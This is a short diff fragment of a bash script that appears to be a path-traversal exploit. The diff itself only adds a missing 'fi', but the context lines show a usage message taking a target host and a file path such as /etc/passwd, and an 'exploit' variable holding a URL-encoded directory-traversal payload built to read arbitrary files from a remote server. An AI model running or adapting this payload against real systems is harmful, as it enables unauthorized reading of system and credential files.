@@ -8,7 +8,7 @@
 
 if [[ $1 == "" ]];then
   echo "USAGE: $0 host path <1.2.3.4> </etc/passwd>"
-
+fi
 
 host=$1
 exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
